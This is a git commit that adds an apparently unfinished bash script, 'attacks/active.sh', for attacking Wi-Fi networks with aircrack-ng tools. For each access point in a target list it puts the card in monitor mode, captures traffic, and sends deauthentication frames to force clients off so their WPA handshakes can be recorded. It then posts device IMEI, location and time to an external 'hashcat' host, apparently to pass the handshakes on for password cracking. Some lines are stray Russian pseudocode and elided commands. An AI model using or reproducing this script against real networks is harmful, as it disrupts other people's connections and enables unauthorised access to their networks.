bdf7381c597cab3e4b11d92bad87caca14653089
rinamuka <58566654+rinamuka@users.noreply.github.com>
2021-08-05 01:02:07 +0300

    Create active.sh

---
+++ attacks/active.sh
@@ -0,0 +1,35 @@
+#!/bin/bash
+
+main(){
+  rm -rf shakes
+	airmon-ng check kill
+	airmon-ng start wlan0mon
+  airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null 
+	#ip link set wlan0mon down
+	#iw wlan0mon set monitor control
+	#ip link set wlan0mon up
+
+	mkdir shakes
+	while read line
+	do
+    первую пропускаем
+    читаем до пустой строки
+		channel=`echo $line | awk '{print $2}'`
+		bssid=`echo $line | awk '{print $1}'`
+		#iwconfig wlan0mon channel $channel
+		mkdir shakes/$bssid
+		echo $bssid
+		echo $channel
+		
+		airodump-ng --bssid $bssid  -w /home/kali/shakes/$bssid/$bssid wlan0mon < /dev/null > /dev/null &  
+		aireplay-ng  -a $bssid -0 10 wlan0mon
+		kill $!
+		tar ...
+		scp ...
+		curl -X POST -H "Content-Type: application/json" -d "imei устройства, координаты, время" http://hashcat:9090
+		#-w /home/kali/shakes/$bssid/$bssid wlan0mon > /dev/null & sleep 5; kill $! 
+	done < $1
+}
+
+
+main $1
